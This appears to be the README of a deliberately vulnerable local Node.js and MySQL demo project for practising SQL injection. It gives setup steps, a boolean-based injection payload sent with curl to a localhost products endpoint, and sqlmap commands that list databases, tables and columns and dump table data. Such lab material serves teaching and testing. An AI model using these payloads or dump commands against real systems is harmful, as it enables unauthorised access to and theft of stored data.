# SQL Injection test

## How to run this project
```bash
# have an instance of mysql running and change '/infra/db/connection.js'
# to access this instance
# and then you can execute the project with:
$ npm install
$ npm run migrate
$ npm run seed
# an alternative is:
$ docker-compose up
```

## Vulnerabilities
```bash
curl http://localhost:8080/products?product=") OR "1"="1" OR "1" like ("
```
- [Boolean-based blind test](https://beaglesecurity.com/blog/vulnerability/boolean-based-blind-sql-injection.html)

Simple demonstration of the error: `?product=") OR "1"="1" OR "1" like ("`

### SQLMap
[Kali tools - SQLMap](https://www.kali.org/tools/sqlmap/)

#### Install it

```bash
$ sudo apt install sqlmap

```

#### Use it

```bash
# List databases
$ sqlmap -u "http://localhost:8080/products?sortBy=1" --dbs

# List tables
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> --tables

# List columns
$ sqlmap -u "http://localhost:8080/products?sortBy=1" --col

# View table data 
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> -T <table_name>

# Or list all data 
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> -a
```
